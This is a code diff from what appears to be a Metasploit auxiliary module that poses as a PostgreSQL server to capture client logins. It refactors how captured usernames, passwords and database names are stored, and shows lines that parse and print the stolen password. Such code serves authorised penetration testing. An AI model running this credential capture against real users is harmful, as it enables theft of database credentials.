@@ -42,6 +42,32 @@ class Metasploit3 < Msf::Auxiliary
     exploit()
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def on_client_connect(c)
     @state[c] = {
       :name    => "#{c.peerhost}:#{c.peerport}",
@@ -74,16 +100,13 @@ class Metasploit3 < Msf::Auxiliary
       # Password message
       data.slice!(0, 5).unpack("N")[0] # skip over length
       @state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
-      report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'psql_client',
-        :user => @state[c][:username],
-        :pass => @state[c][:password],
-        :type => "PostgreSQL credentials",
-        :proof => @state[c][:database],
-        :source_type => "captured",
-        :active => true
+      report_cred(
+        ip: c.peerhost,
+        port: datastore['SRVPORT'],
+        service_name: 'psql_client',
+        user: @state[c][:username],
+        password: @state[c][:password],
+        proof: @state[c][:database]
       )
       print_status("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
       # send failure message
